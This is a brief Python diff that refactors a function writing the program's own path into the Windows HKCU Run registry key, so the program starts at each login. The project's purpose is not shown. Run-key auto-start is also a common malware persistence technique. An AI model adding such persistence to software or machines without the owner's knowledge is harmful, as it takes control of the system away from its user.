@@ -9,10 +9,10 @@ from tools.dictionary import SERVICE_NAME
 # Return:
 # 	True				- Success
 # 	False				- Failed
-def placeStartup(name=SERVICE_NAME):
+def placeStartup(name=SERVICE_NAME, root_path = os.getcwd()):
 	try:
 		key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")
-		winreg.SetValueEx(key, name,0,winreg.REG_SZ,os.getcwd() +"\\"+os.path.basename(sys.argv[0]))
+		winreg.SetValueEx(key, name,0,winreg.REG_SZ, root_path +"\\"+os.path.basename(sys.argv[0]))
 		key.Close()
 		return True
 	except:
